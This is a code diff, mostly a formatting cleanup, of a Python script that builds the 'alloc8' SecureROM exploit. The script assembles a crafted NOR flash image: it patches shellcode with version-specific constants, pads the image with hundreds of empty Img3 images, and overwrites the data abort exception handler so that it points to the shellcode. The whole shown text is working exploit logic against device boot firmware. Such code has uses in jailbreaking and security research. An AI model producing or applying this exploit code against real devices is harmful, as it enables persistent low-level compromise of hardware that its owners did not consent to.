@@ -61,7 +61,12 @@ alloc8_constants_359_3_2 = [
 
 def empty_img3(size):
     assert size >= 20
-    return struct.pack('<4s3I4s', 'Img3'[::-1], size, 0, 0, 'zero'[::-1]) + '\x00' * (size - 20)
+    return struct.pack('<4s3I4s',
+                       'Img3'[::-1],
+                       size,
+                       0,
+                       0,
+                       'zero'[::-1]) + '\x00' * (size - 20)
 
 
 def exploit(nor, version):
@@ -72,19 +77,22 @@ def exploit(nor, version):
         constants = alloc8_constants_359_3_2
         exceptions = [0x5628, 0x5638]
     else:
-        print('ERROR: SecureROM version %s is not supported by alloc8.' % version)
+        print(
+            'ERROR: SecureROM version %s is not supported by alloc8.' %
+            version)
         sys.exit(1)
 
     for c in nor.parts[1]:
         assert c == '\x00'
     assert len(nor.images) < 32
 
-    MAX_SHELLCODE_LENGTH = 460
+    max_shellcode_length = 460
     with open('bin/alloc8-shellcode.bin', 'rb') as f:
         shellcode = f.read()
-    assert len(shellcode) <= MAX_SHELLCODE_LENGTH
+    assert len(shellcode) <= max_shellcode_length
 
-    # Shellcode has placeholder values for constants; check they match and replace with constants from config.
+    # Shellcode has placeholder values for constants; check they match and
+    # replace with constants from config.
     placeholders_offset = len(shellcode) - 4 * len(constants)
     for i in range(len(constants)):
         offset = placeholders_offset + 4 * i
@@ -92,23 +100,32 @@ def exploit(nor, version):
         assert value == 0xBAD00001 + i
 
     new_nor = copy.deepcopy(nor)
-    new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants) + '\x00' * (
-                MAX_SHELLCODE_LENGTH - len(shellcode))
+    new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(
+        constants), *constants) + b'\x00' * (max_shellcode_length - len(shellcode))
 
     while len(new_nor.images) < 713:
         new_nor.images.append(empty_img3(new_nor.block_size))
 
     # Image no. 714 must end at the end of the 4096-byte block.
-    NOR_READ_SIZE = 4096
+    nor_read_size = 4096
     offset = 0
     for image in new_nor.images:
         offset += len(image)
-    size = NOR_READ_SIZE - offset % NOR_READ_SIZE
+    size = nor_read_size - offset % nor_read_size
     new_nor.images.append(empty_img3(size))
 
-    # This image is copied to address 0x8. SHELLCODE_ADDRESS overrides the data abort exception handler.
-    SHELLCODE_ADDRESS = 0x84026214 + 1
-    new_nor.images.append(empty_img3(52)[:40] + struct.pack('<4I', SHELLCODE_ADDRESS, 0, *exceptions))
+    # This image is copied to address 0x8. shellcode_address overrides the
+    # data abort exception handler.
+    shellcode_address = 0x84026214 + 1
+    new_nor.images.append(
+        empty_img3(52)[
+            :40] +
+        struct.pack(
+            '<4I',
+            shellcode_address,
+            0,
+            *
+            exceptions))
 
     return new_nor
 
